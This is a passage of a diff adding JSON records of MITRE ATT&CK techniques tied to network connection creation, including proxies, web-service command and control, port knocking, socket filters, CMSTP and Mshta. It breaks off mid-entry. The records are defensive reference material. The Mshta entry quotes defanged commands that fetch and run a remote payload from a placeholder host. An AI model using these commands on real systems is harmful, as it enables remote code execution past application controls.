+    "technique_description": "Adversaries may use an internal proxy to direct command and control traffic between two or more systems in a compromised environment. Many tools exist that enable traffic redirection through proxies or port redirection, including [HTRAN](https://attack.mitre.org/software/S0040), ZXProxy, and ZXPortMap. (Citation: Trend Micro APT Attack Tools) Adversaries use internal proxies to manage command and control communications inside a compromised environment, to reduce the number of simultaneous outbound network connections, to provide resiliency in the face of connection loss, or to ride over existing trusted communications paths between infected systems to avoid suspicion. Internal proxy connections may use common peer-to-peer (p2p) networking protocols, such as SMB, to better blend in with the environment.\n\nBy using a compromised internal system as a proxy, adversaries may conceal the true destination of C2 traffic while reducing the need for numerous connections to external systems.",
+    "technique_references": [
+      {
+        "source_name": "Trend Micro APT Attack Tools",
+        "url": "http://blog.trendmicro.com/trendlabs-security-intelligence/in-depth-look-apt-attack-tools-of-the-trade/",
+        "description": "Wilhoit, K. (2013, March 4). In-Depth Look: APT Attack Tools of the Trade. Retrieved December 2, 2015.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "University of Birmingham C2",
+        "url": "https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf",
+        "description": "Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.",
+        "external_id": "none"
+      }
+    ],
+    "technique_required_permissions": "none",
+    "technique_effective_permissions": "none",
+    "search_token": "none"
+  },
+  {
+    "id": "attack-pattern--69b8fd78-40e8-4600-ae4d-662c9d7afdb3",
+    "platform": "linux|macos|windows",
+    "tid": "T1090.002",
+    "technique": "External Proxy",
+    "tactic": "command-and-control",
+    "datasources": "network-connection-creation",
+    "has_subtechniques": false,
+    "is_deprecated": false,
+    "is_revoked": false,
+    "subtechniques": [],
+    "count_subtechniques": 0,
+    "correlation_adversary": "none",
+    "correlation_malware": "none",
+    "correlation_tool": "none",
+    "correlation_gid": "none",
+    "technique_description": "Adversaries may use an external proxy to act as an intermediary for network communications to a command and control server to avoid direct connections to their infrastructure. Many tools exist that enable traffic redirection through proxies or port redirection, including [HTRAN](https://attack.mitre.org/software/S0040), ZXProxy, and ZXPortMap. (Citation: Trend Micro APT Attack Tools) Adversaries use these types of proxies to manage command and control communications, to provide resiliency in the face of connection loss, or to ride over existing trusted communications paths to avoid suspicion.\n\nExternal connection proxies are used to mask the destination of C2 traffic and are typically implemented with port redirectors. Compromised systems outside of the victim environment may be used for these purposes, as well as purchased infrastructure such as cloud-based resources or virtual private servers. Proxies may be chosen based on the low likelihood that a connection to them from a compromised system would be investigated. Victim systems would communicate directly with the external proxy on the Internet and then the proxy would forward communications to the C2 server.",
+    "technique_references": [
+      {
+        "source_name": "Trend Micro APT Attack Tools",
+        "url": "http://blog.trendmicro.com/trendlabs-security-intelligence/in-depth-look-apt-attack-tools-of-the-trade/",
+        "description": "Wilhoit, K. (2013, March 4). In-Depth Look: APT Attack Tools of the Trade. Retrieved December 2, 2015.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "University of Birmingham C2",
+        "url": "https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf",
+        "description": "Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.",
+        "external_id": "none"
+      }
+    ],
+    "technique_required_permissions": "none",
+    "technique_effective_permissions": "none",
+    "search_token": "none"
+  },
+  {
+    "id": "attack-pattern--a782ebe2-daba-42c7-bc82-e8e9d923162d",
+    "platform": "linux|macos|windows|network",
+    "tid": "T1090.003",
+    "technique": "Multi-hop Proxy",
+    "tactic": "command-and-control",
+    "datasources": "network-connection-creation",
+    "has_subtechniques": false,
+    "is_deprecated": false,
+    "is_revoked": false,
+    "subtechniques": [],
+    "count_subtechniques": 0,
+    "correlation_adversary": "none",
+    "correlation_malware": "none",
+    "correlation_tool": "none",
+    "correlation_gid": "none",
+    "technique_description": "To disguise the source of malicious traffic, adversaries may chain together multiple proxies. Typically, a defender will be able to identify the last proxy traffic traversed before it enters their network; the defender may or may not be able to identify any previous proxies before the last-hop proxy. This technique makes identifying the original source of the malicious traffic even more difficult by requiring the defender to trace malicious traffic through several proxies to identify its source. A particular variant of this behavior is to use onion routing networks, such as the publicly available TOR network. (Citation: Onion Routing)\n\nIn the case of network infrastructure, particularly routers, it is possible for an adversary to leverage multiple compromised devices to create a multi-hop proxy chain within the Wide-Area Network (WAN) of the enterprise.  By leveraging [Patch System Image](https://attack.mitre.org/techniques/T1601/001), adversaries can add custom code to the affected network devices that will implement onion routing between those nodes.  This custom onion routing network will transport the encrypted C2 traffic through the compromised population, allowing adversaries to communicate with any device within the onion routing network.  This method is dependent upon the [Network Boundary Bridging](https://attack.mitre.org/techniques/T1599) method in order to allow the adversaries to cross the protected network boundary of the Internet perimeter and into the organization’s WAN. Protocols such as ICMP may be used as a transport.",
+    "technique_references": [
+      {
+        "source_name": "Onion Routing",
+        "url": "https://en.wikipedia.org/wiki/Onion_routing",
+        "description": "Wikipedia. (n.d.). Onion Routing. Retrieved October 20, 2020.",
+        "external_id": "none"
+      }
+    ],
+    "technique_required_permissions": "none",
+    "technique_effective_permissions": "none",
+    "search_token": "none"
+  },
+  {
+    "id": "attack-pattern--be055942-6e63-49d7-9fa1-9cb7d8a8f3f4",
+    "platform": "linux|macos|windows",
+    "tid": "T1102.002",
+    "technique": "Bidirectional Communication",
+    "tactic": "command-and-control",
+    "datasources": "network-connection-creation",
+    "has_subtechniques": false,
+    "is_deprecated": false,
+    "is_revoked": false,
+    "subtechniques": [],
+    "count_subtechniques": 0,
+    "correlation_adversary": "none",
+    "correlation_malware": "none",
+    "correlation_tool": "none",
+    "correlation_gid": "none",
+    "technique_description": "Adversaries may use an existing, legitimate external Web service as a means for sending commands to and receiving output from a compromised system over the Web service channel. Compromised systems may leverage popular websites and social media to host command and control (C2) instructions. Those infected systems can then send the output from those commands back over that Web service channel. The return traffic may occur in a variety of ways, depending on the Web service being utilized. For example, the return traffic may take the form of the compromised system posting a comment on a forum, issuing a pull request to development project, updating a document hosted on a Web service, or by sending a Tweet. \n\nPopular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection. ",
+    "technique_references": [
+      {
+        "source_name": "University of Birmingham C2",
+        "url": "https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf",
+        "description": "Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.",
+        "external_id": "none"
+      }
+    ],
+    "technique_required_permissions": "user",
+    "technique_effective_permissions": "none",
+    "search_token": "none"
+  },
+  {
+    "id": "attack-pattern--9c99724c-a483-4d60-ad9d-7f004e42e8e8",
+    "platform": "linux|macos|windows",
+    "tid": "T1102.003",
+    "technique": "One-Way Communication",
+    "tactic": "command-and-control",
+    "datasources": "network-connection-creation",
+    "has_subtechniques": false,
+    "is_deprecated": false,
+    "is_revoked": false,
+    "subtechniques": [],
+    "count_subtechniques": 0,
+    "correlation_adversary": "none",
+    "correlation_malware": "none",
+    "correlation_tool": "none",
+    "correlation_gid": "none",
+    "technique_description": "Adversaries may use an existing, legitimate external Web service as a means for sending commands to a compromised system without receiving return output over the Web service channel. Compromised systems may leverage popular websites and social media to host command and control (C2) instructions. Those infected systems may opt to send the output from those commands back over a different C2 channel, including to another distinct Web service. Alternatively, compromised systems may return no output at all in cases where adversaries want to send instructions to systems and do not want a response.\n\nPopular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.",
+    "technique_references": [
+      {
+        "source_name": "University of Birmingham C2",
+        "url": "https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf",
+        "description": "Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.",
+        "external_id": "none"
+      }
+    ],
+    "technique_required_permissions": "user",
+    "technique_effective_permissions": "none",
+    "search_token": "none"
+  },
+  {
+    "id": "attack-pattern--b4694861-542c-48ea-9eb1-10d356e7140a",
+    "platform": "office-365|windows|google-workspace",
+    "tid": "T1114.002",
+    "technique": "Remote Email Collection",
+    "tactic": "collection",
+    "datasources": "network-connection-creation",
+    "has_subtechniques": false,
+    "is_deprecated": false,
+    "is_revoked": false,
+    "subtechniques": [],
+    "count_subtechniques": 0,
+    "correlation_adversary": "none",
+    "correlation_malware": "none",
+    "correlation_tool": "none",
+    "correlation_gid": "none",
+    "technique_description": "Adversaries may target an Exchange server, Office 365, or Google Workspace to collect sensitive information. Adversaries may leverage a user's credentials and interact directly with the Exchange server to acquire information from within a network. Adversaries may also access externally facing Exchange services, Office 365, or Google Workspace to access email using credentials or access tokens. Tools such as [MailSniper](https://attack.mitre.org/software/S0413) can be used to automate searches for specific keywords.",
+    "technique_references": [],
+    "technique_required_permissions": "none",
+    "technique_effective_permissions": "none",
+    "search_token": "none"
+  },
+  {
+    "id": "attack-pattern--ef67e13e-5598-4adc-bdb2-998225874fa9",
+    "platform": "linux|macos|windows",
+    "tid": "T1204.001",
+    "technique": "Malicious Link",
+    "tactic": "execution",
+    "datasources": "network-connection-creation",
+    "has_subtechniques": false,
+    "is_deprecated": false,
+    "is_revoked": false,
+    "subtechniques": [],
+    "count_subtechniques": 0,
+    "correlation_adversary": "none",
+    "correlation_malware": "none",
+    "correlation_tool": "none",
+    "correlation_gid": "none",
+    "technique_description": "An adversary may rely upon a user clicking a malicious link in order to gain execution. Users may be subjected to social engineering to get them to click on a link that will lead to code execution. This user action will typically be observed as follow-on behavior from [Spearphishing Link](https://attack.mitre.org/techniques/T1566/002). Clicking on a link may also lead to other execution techniques such as exploitation of a browser or application vulnerability via [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203). Links may also lead users to download files that require execution via [Malicious File](https://attack.mitre.org/techniques/T1204/002).",
+    "technique_references": [],
+    "technique_required_permissions": "user",
+    "technique_effective_permissions": "none",
+    "search_token": "none"
+  },
+  {
+    "id": "attack-pattern--8868cb5b-d575-4a60-acb2-07d37389a2fd",
+    "platform": "linux|macos|windows|network",
+    "tid": "T1205.001",
+    "technique": "Port Knocking",
+    "tactic": "defense-evasion",
+    "datasources": "network-connection-creation",
+    "has_subtechniques": false,
+    "is_deprecated": false,
+    "is_revoked": false,
+    "subtechniques": [],
+    "count_subtechniques": 0,
+    "correlation_adversary": "none",
+    "correlation_malware": "none",
+    "correlation_tool": "none",
+    "correlation_gid": "none",
+    "technique_description": "Adversaries may use port knocking to hide open ports used for persistence or command and control. To enable a port, an adversary sends a series of attempted connections to a predefined sequence of closed ports. After the sequence is completed, opening a port is often accomplished by the host based firewall, but could also be implemented by custom software.\n\nThis technique has been observed both for the dynamic opening of a listening port as well as the initiating of a connection to a listening server on a different system.\n\nThe observation of the signal packets to trigger the communication can be conducted through different methods. One means, originally implemented by Cd00r (Citation: Hartrell cd00r 2002), is to use the libpcap libraries to sniff for the packets in question. Another method leverages raw sockets, which enables the malware to use ports that are already open for use by other programs.",
+    "technique_references": [
+      {
+        "source_name": "Hartrell cd00r 2002",
+        "url": "https://www.giac.org/paper/gcih/342/handle-cd00r-invisible-backdoor/103631",
+        "description": "Hartrell, Greg. (2002, August). Get a handle on cd00r: The invisible backdoor. Retrieved October 13, 2018.",
+        "external_id": "none"
+      }
+    ],
+    "technique_required_permissions": "user",
+    "technique_effective_permissions": "none",
+    "search_token": "none"
+  },
+  {
+    "id": "attack-pattern--8868cb5b-d575-4a60-acb2-07d37389a2fd",
+    "platform": "linux|macos|windows|network",
+    "tid": "T1205.001",
+    "technique": "Port Knocking",
+    "tactic": "persistence",
+    "datasources": "network-connection-creation",
+    "has_subtechniques": false,
+    "is_deprecated": false,
+    "is_revoked": false,
+    "subtechniques": [],
+    "count_subtechniques": 0,
+    "correlation_adversary": "none",
+    "correlation_malware": "none",
+    "correlation_tool": "none",
+    "correlation_gid": "none",
+    "technique_description": "Adversaries may use port knocking to hide open ports used for persistence or command and control. To enable a port, an adversary sends a series of attempted connections to a predefined sequence of closed ports. After the sequence is completed, opening a port is often accomplished by the host based firewall, but could also be implemented by custom software.\n\nThis technique has been observed both for the dynamic opening of a listening port as well as the initiating of a connection to a listening server on a different system.\n\nThe observation of the signal packets to trigger the communication can be conducted through different methods. One means, originally implemented by Cd00r (Citation: Hartrell cd00r 2002), is to use the libpcap libraries to sniff for the packets in question. Another method leverages raw sockets, which enables the malware to use ports that are already open for use by other programs.",
+    "technique_references": [
+      {
+        "source_name": "Hartrell cd00r 2002",
+        "url": "https://www.giac.org/paper/gcih/342/handle-cd00r-invisible-backdoor/103631",
+        "description": "Hartrell, Greg. (2002, August). Get a handle on cd00r: The invisible backdoor. Retrieved October 13, 2018.",
+        "external_id": "none"
+      }
+    ],
+    "technique_required_permissions": "user",
+    "technique_effective_permissions": "none",
+    "search_token": "none"
+  },
+  {
+    "id": "attack-pattern--8868cb5b-d575-4a60-acb2-07d37389a2fd",
+    "platform": "linux|macos|windows|network",
+    "tid": "T1205.001",
+    "technique": "Port Knocking",
+    "tactic": "command-and-control",
+    "datasources": "network-connection-creation",
+    "has_subtechniques": false,
+    "is_deprecated": false,
+    "is_revoked": false,
+    "subtechniques": [],
+    "count_subtechniques": 0,
+    "correlation_adversary": "none",
+    "correlation_malware": "none",
+    "correlation_tool": "none",
+    "correlation_gid": "none",
+    "technique_description": "Adversaries may use port knocking to hide open ports used for persistence or command and control. To enable a port, an adversary sends a series of attempted connections to a predefined sequence of closed ports. After the sequence is completed, opening a port is often accomplished by the host based firewall, but could also be implemented by custom software.\n\nThis technique has been observed both for the dynamic opening of a listening port as well as the initiating of a connection to a listening server on a different system.\n\nThe observation of the signal packets to trigger the communication can be conducted through different methods. One means, originally implemented by Cd00r (Citation: Hartrell cd00r 2002), is to use the libpcap libraries to sniff for the packets in question. Another method leverages raw sockets, which enables the malware to use ports that are already open for use by other programs.",
+    "technique_references": [
+      {
+        "source_name": "Hartrell cd00r 2002",
+        "url": "https://www.giac.org/paper/gcih/342/handle-cd00r-invisible-backdoor/103631",
+        "description": "Hartrell, Greg. (2002, August). Get a handle on cd00r: The invisible backdoor. Retrieved October 13, 2018.",
+        "external_id": "none"
+      }
+    ],
+    "technique_required_permissions": "user",
+    "technique_effective_permissions": "none",
+    "search_token": "none"
+  },
+  {
+    "id": "attack-pattern--005cc321-08ce-4d17-b1ea-cb5275926520",
+    "platform": "linux|macos|windows",
+    "tid": "T1205.002",
+    "technique": "Socket Filters",
+    "tactic": "defense-evasion",
+    "datasources": "network-connection-creation",
+    "has_subtechniques": false,
+    "is_deprecated": false,
+    "is_revoked": false,
+    "subtechniques": [],
+    "count_subtechniques": 0,
+    "correlation_adversary": "none",
+    "correlation_malware": "none",
+    "correlation_tool": "none",
+    "correlation_gid": "none",
+    "technique_description": "Adversaries may attach filters to a network socket to monitor then activate backdoors used for persistence or command and control. With elevated permissions, adversaries can use features such as the `libpcap` library to open sockets and install filters to allow or disallow certain types of data to come through the socket. The filter may apply to all traffic passing through the specified network interface (or every interface if not specified). When the network interface receives a packet matching the filter criteria, additional actions can be triggered on the host, such as activation of a reverse shell.\n\nTo establish a connection, an adversary sends a crafted packet to the targeted host that matches the installed filter criteria.(Citation: haking9 libpcap network sniffing) Adversaries have used these socket filters to trigger the installation of implants, conduct ping backs, and to invoke command shells. Communication with these socket filters may also be used in conjunction with [Protocol Tunneling](https://attack.mitre.org/techniques/T1572).(Citation: exatrack bpf filters passive backdoors)(Citation: Leonardo Turla Penquin May 2020)\n\nFilters can be installed on any Unix-like platform with `libpcap` installed or on Windows hosts using `Winpcap`.  Adversaries may use either `libpcap` with `pcap_setfilter` or the standard library function `setsockopt` with `SO_ATTACH_FILTER` options. Since the socket connection is not active until the packet is received, this behavior may be difficult to detect due to the lack of activity on a host, low CPU overhead, and limited visibility into raw socket usage.",
+    "technique_references": [
+      {
+        "source_name": "exatrack bpf filters passive backdoors",
+        "url": "https://exatrack.com/public/Tricephalic_Hellkeeper.pdf",
+        "description": "ExaTrack. (2022, May 11). Tricephalic Hellkeeper: a tale of a passive backdoor. Retrieved October 18, 2022.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "crowdstrike bpf socket filters",
+        "url": "https://www.crowdstrike.com/blog/how-to-hunt-for-decisivearchitect-and-justforfun-implant/",
+        "description": "Jamie Harries. (2022, May 25). Hunting a Global Telecommunications Threat: DecisiveArchitect and Its Custom Implant JustForFun. Retrieved October 18, 2022.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "Leonardo Turla Penquin May 2020",
+        "url": "https://www.leonardo.com/documents/20142/10868623/Malware+Technical+Insight+_Turla+%E2%80%9CPenquin_x64%E2%80%9D.pdf",
+        "description": "Leonardo. (2020, May 29). MALWARE TECHNICAL INSIGHT TURLA “Penquin_x64”. Retrieved March 11, 2021.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "haking9 libpcap network sniffing",
+        "url": "http://recursos.aldabaknocking.com/libpcapHakin9LuisMartinGarcia.pdf",
+        "description": "Luis Martin Garcia. (2008, February 1). Hakin9 Issue 2/2008 Vol 3 No.2 VoIP Abuse: Storming SIP Security. Retrieved October 18, 2022.",
+        "external_id": "none"
+      }
+    ],
+    "technique_required_permissions": "none",
+    "technique_effective_permissions": "none",
+    "search_token": "none"
+  },
+  {
+    "id": "attack-pattern--005cc321-08ce-4d17-b1ea-cb5275926520",
+    "platform": "linux|macos|windows",
+    "tid": "T1205.002",
+    "technique": "Socket Filters",
+    "tactic": "persistence",
+    "datasources": "network-connection-creation",
+    "has_subtechniques": false,
+    "is_deprecated": false,
+    "is_revoked": false,
+    "subtechniques": [],
+    "count_subtechniques": 0,
+    "correlation_adversary": "none",
+    "correlation_malware": "none",
+    "correlation_tool": "none",
+    "correlation_gid": "none",
+    "technique_description": "Adversaries may attach filters to a network socket to monitor then activate backdoors used for persistence or command and control. With elevated permissions, adversaries can use features such as the `libpcap` library to open sockets and install filters to allow or disallow certain types of data to come through the socket. The filter may apply to all traffic passing through the specified network interface (or every interface if not specified). When the network interface receives a packet matching the filter criteria, additional actions can be triggered on the host, such as activation of a reverse shell.\n\nTo establish a connection, an adversary sends a crafted packet to the targeted host that matches the installed filter criteria.(Citation: haking9 libpcap network sniffing) Adversaries have used these socket filters to trigger the installation of implants, conduct ping backs, and to invoke command shells. Communication with these socket filters may also be used in conjunction with [Protocol Tunneling](https://attack.mitre.org/techniques/T1572).(Citation: exatrack bpf filters passive backdoors)(Citation: Leonardo Turla Penquin May 2020)\n\nFilters can be installed on any Unix-like platform with `libpcap` installed or on Windows hosts using `Winpcap`.  Adversaries may use either `libpcap` with `pcap_setfilter` or the standard library function `setsockopt` with `SO_ATTACH_FILTER` options. Since the socket connection is not active until the packet is received, this behavior may be difficult to detect due to the lack of activity on a host, low CPU overhead, and limited visibility into raw socket usage.",
+    "technique_references": [
+      {
+        "source_name": "exatrack bpf filters passive backdoors",
+        "url": "https://exatrack.com/public/Tricephalic_Hellkeeper.pdf",
+        "description": "ExaTrack. (2022, May 11). Tricephalic Hellkeeper: a tale of a passive backdoor. Retrieved October 18, 2022.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "crowdstrike bpf socket filters",
+        "url": "https://www.crowdstrike.com/blog/how-to-hunt-for-decisivearchitect-and-justforfun-implant/",
+        "description": "Jamie Harries. (2022, May 25). Hunting a Global Telecommunications Threat: DecisiveArchitect and Its Custom Implant JustForFun. Retrieved October 18, 2022.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "Leonardo Turla Penquin May 2020",
+        "url": "https://www.leonardo.com/documents/20142/10868623/Malware+Technical+Insight+_Turla+%E2%80%9CPenquin_x64%E2%80%9D.pdf",
+        "description": "Leonardo. (2020, May 29). MALWARE TECHNICAL INSIGHT TURLA “Penquin_x64”. Retrieved March 11, 2021.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "haking9 libpcap network sniffing",
+        "url": "http://recursos.aldabaknocking.com/libpcapHakin9LuisMartinGarcia.pdf",
+        "description": "Luis Martin Garcia. (2008, February 1). Hakin9 Issue 2/2008 Vol 3 No.2 VoIP Abuse: Storming SIP Security. Retrieved October 18, 2022.",
+        "external_id": "none"
+      }
+    ],
+    "technique_required_permissions": "none",
+    "technique_effective_permissions": "none",
+    "search_token": "none"
+  },
+  {
+    "id": "attack-pattern--005cc321-08ce-4d17-b1ea-cb5275926520",
+    "platform": "linux|macos|windows",
+    "tid": "T1205.002",
+    "technique": "Socket Filters",
+    "tactic": "command-and-control",
+    "datasources": "network-connection-creation",
+    "has_subtechniques": false,
+    "is_deprecated": false,
+    "is_revoked": false,
+    "subtechniques": [],
+    "count_subtechniques": 0,
+    "correlation_adversary": "none",
+    "correlation_malware": "none",
+    "correlation_tool": "none",
+    "correlation_gid": "none",
+    "technique_description": "Adversaries may attach filters to a network socket to monitor then activate backdoors used for persistence or command and control. With elevated permissions, adversaries can use features such as the `libpcap` library to open sockets and install filters to allow or disallow certain types of data to come through the socket. The filter may apply to all traffic passing through the specified network interface (or every interface if not specified). When the network interface receives a packet matching the filter criteria, additional actions can be triggered on the host, such as activation of a reverse shell.\n\nTo establish a connection, an adversary sends a crafted packet to the targeted host that matches the installed filter criteria.(Citation: haking9 libpcap network sniffing) Adversaries have used these socket filters to trigger the installation of implants, conduct ping backs, and to invoke command shells. Communication with these socket filters may also be used in conjunction with [Protocol Tunneling](https://attack.mitre.org/techniques/T1572).(Citation: exatrack bpf filters passive backdoors)(Citation: Leonardo Turla Penquin May 2020)\n\nFilters can be installed on any Unix-like platform with `libpcap` installed or on Windows hosts using `Winpcap`.  Adversaries may use either `libpcap` with `pcap_setfilter` or the standard library function `setsockopt` with `SO_ATTACH_FILTER` options. Since the socket connection is not active until the packet is received, this behavior may be difficult to detect due to the lack of activity on a host, low CPU overhead, and limited visibility into raw socket usage.",
+    "technique_references": [
+      {
+        "source_name": "exatrack bpf filters passive backdoors",
+        "url": "https://exatrack.com/public/Tricephalic_Hellkeeper.pdf",
+        "description": "ExaTrack. (2022, May 11). Tricephalic Hellkeeper: a tale of a passive backdoor. Retrieved October 18, 2022.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "crowdstrike bpf socket filters",
+        "url": "https://www.crowdstrike.com/blog/how-to-hunt-for-decisivearchitect-and-justforfun-implant/",
+        "description": "Jamie Harries. (2022, May 25). Hunting a Global Telecommunications Threat: DecisiveArchitect and Its Custom Implant JustForFun. Retrieved October 18, 2022.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "Leonardo Turla Penquin May 2020",
+        "url": "https://www.leonardo.com/documents/20142/10868623/Malware+Technical+Insight+_Turla+%E2%80%9CPenquin_x64%E2%80%9D.pdf",
+        "description": "Leonardo. (2020, May 29). MALWARE TECHNICAL INSIGHT TURLA “Penquin_x64”. Retrieved March 11, 2021.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "haking9 libpcap network sniffing",
+        "url": "http://recursos.aldabaknocking.com/libpcapHakin9LuisMartinGarcia.pdf",
+        "description": "Luis Martin Garcia. (2008, February 1). Hakin9 Issue 2/2008 Vol 3 No.2 VoIP Abuse: Storming SIP Security. Retrieved October 18, 2022.",
+        "external_id": "none"
+      }
+    ],
+    "technique_required_permissions": "none",
+    "technique_effective_permissions": "none",
+    "search_token": "none"
+  },
+  {
+    "id": "attack-pattern--4cbc6a62-9e34-4f94-8a19-5c1a11392a49",
+    "platform": "windows",
+    "tid": "T1218.003",
+    "technique": "CMSTP",
+    "tactic": "defense-evasion",
+    "datasources": "network-connection-creation",
+    "has_subtechniques": false,
+    "is_deprecated": false,
+    "is_revoked": false,
+    "subtechniques": [],
+    "count_subtechniques": 0,
+    "correlation_adversary": "none",
+    "correlation_malware": "none",
+    "correlation_tool": "none",
+    "correlation_gid": "none",
+    "technique_description": "Adversaries may abuse CMSTP to proxy execution of malicious code. The Microsoft Connection Manager Profile Installer (CMSTP.exe) is a command-line program used to install Connection Manager service profiles. (Citation: Microsoft Connection Manager Oct 2009) CMSTP.exe accepts an installation information file (INF) as a parameter and installs a service profile leveraged for remote access connections.\n\nAdversaries may supply CMSTP.exe with INF files infected with malicious commands. (Citation: Twitter CMSTP Usage Jan 2018) Similar to [Regsvr32](https://attack.mitre.org/techniques/T1218/010) / ”Squiblydoo”, CMSTP.exe may be abused to load and execute DLLs (Citation: MSitPros CMSTP Aug 2017)  and/or COM scriptlets (SCT) from remote servers. (Citation: Twitter CMSTP Jan 2018) (Citation: GitHub Ultimate AppLocker Bypass List) (Citation: Endurant CMSTP July 2018) This execution may also bypass AppLocker and other application control defenses since CMSTP.exe is a legitimate binary that may be signed by Microsoft.\n\nCMSTP.exe can also be abused to [Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002) and execute arbitrary commands from a malicious INF through an auto-elevated COM interface. (Citation: MSitPros CMSTP Aug 2017) (Citation: GitHub Ultimate AppLocker Bypass List) (Citation: Endurant CMSTP July 2018)",
+    "technique_references": [
+      {
+        "source_name": "Twitter CMSTP Usage Jan 2018",
+        "url": "https://twitter.com/ItsReallyNick/status/958789644165894146",
+        "description": "Carr, N. (2018, January 31). Here is some early bad cmstp.exe... Retrieved April 11, 2018.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "Microsoft Connection Manager Oct 2009",
+        "url": "https://docs.microsoft.com/previous-versions/windows/it-pro/windows-server-2003/cc786431(v=ws.10)",
+        "description": "Microsoft. (2009, October 8). How Connection Manager Works. Retrieved April 11, 2018.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "MSitPros CMSTP Aug 2017",
+        "url": "https://msitpros.com/?p=3960",
+        "description": "Moe, O. (2017, August 15). Research on CMSTP.exe. Retrieved April 11, 2018.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "GitHub Ultimate AppLocker Bypass List",
+        "url": "https://github.com/api0cradle/UltimateAppLockerByPassList",
+        "description": "Moe, O. (2018, March 1). Ultimate AppLocker Bypass List. Retrieved April 10, 2018.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "Endurant CMSTP July 2018",
+        "url": "http://www.endurant.io/cmstp/detecting-cmstp-enabled-code-execution-and-uac-bypass-with-sysmon/",
+        "description": "Seetharaman, N. (2018, July 7). Detecting CMSTP-Enabled Code Execution and UAC Bypass With Sysmon.. Retrieved August 6, 2018.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "Twitter CMSTP Jan 2018",
+        "url": "https://twitter.com/NickTyrer/status/958450014111633408",
+        "description": "Tyrer, N. (2018, January 30). CMSTP.exe - remote .sct execution applocker bypass. Retrieved April 11, 2018.",
+        "external_id": "none"
+      }
+    ],
+    "technique_required_permissions": "none",
+    "technique_effective_permissions": "none",
+    "search_token": "none"
+  },
+  {
+    "id": "attack-pattern--840a987a-99bd-4a80-a5c9-0cb2baa6cade",
+    "platform": "windows",
+    "tid": "T1218.005",
+    "technique": "Mshta",
+    "tactic": "defense-evasion",
+    "datasources": "network-connection-creation",
+    "has_subtechniques": false,
+    "is_deprecated": false,
+    "is_revoked": false,
+    "subtechniques": [],
+    "count_subtechniques": 0,
+    "correlation_adversary": "none",
+    "correlation_malware": "none",
+    "correlation_tool": "none",
+    "correlation_gid": "none",
+    "technique_description": "Adversaries may abuse mshta.exe to proxy execution of malicious .hta files and Javascript or VBScript through a trusted Windows utility. There are several examples of different types of threats leveraging mshta.exe during initial compromise and for execution of code (Citation: Cylance Dust Storm) (Citation: Red Canary HTA Abuse Part Deux) (Citation: FireEye Attacks Leveraging HTA) (Citation: Airbus Security Kovter Analysis) (Citation: FireEye FIN7 April 2017) \n\nMshta.exe is a utility that executes Microsoft HTML Applications (HTA) files. (Citation: Wikipedia HTML Application) HTAs are standalone applications that execute using the same models and technologies of Internet Explorer, but outside of the browser. (Citation: MSDN HTML Applications)\n\nFiles may be executed by mshta.exe through an inline script: <code>mshta vbscript:Close(Execute(\"GetObject(\"\"script:https[:]//webserver/payload[.]sct\"\")\"))</code>\n\nThey may also be executed directly from URLs: <code>mshta http[:]//webserver/payload[.]hta</code>\n\nMshta.exe can be used to bypass application control solutions that do not account for its potential use. Since mshta.exe executes outside of the Internet Explorer's security context, it also bypasses browser security settings. (Citation: LOLBAS Mshta)",
+    "technique_references": [
+      {
+        "source_name": "Cylance Dust Storm",
+        "url": "https://s7d2.scene7.com/is/content/cylance/prod/cylance-web/en-us/resources/knowledge-center/resource-library/reports/Op_Dust_Storm_Report.pdf",
+        "description": "Gross, J. (2016, February 23). Operation Dust Storm. Retrieved December 22, 2021.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "Red Canary HTA Abuse Part Deux",
+        "url": "https://www.redcanary.com/blog/microsoft-html-application-hta-abuse-part-deux/",
+        "description": "McCammon, K. (2015, August 14). Microsoft HTML Application (HTA) Abuse, Part Deux. Retrieved October 27, 2017.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "FireEye Attacks Leveraging HTA",
+        "url": "https://www.fireeye.com/blog/threat-research/2017/04/cve-2017-0199-hta-handler.html",
+        "description": "Berry, A., Galang, L., Jiang, G., Leathery, J., Mohandas, R. (2017, April 11). CVE-2017-0199: In the Wild Attacks Leveraging HTA Handler. Retrieved October 27, 2017.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "Airbus Security Kovter Analysis",
+        "url": "https://airbus-cyber-security.com/fileless-malware-behavioural-analysis-kovter-persistence/",
+        "description": "Dove, A. (2016, March 23). Fileless Malware – A Behavioural Analysis Of Kovter Persistence. Retrieved December 5, 2017.",
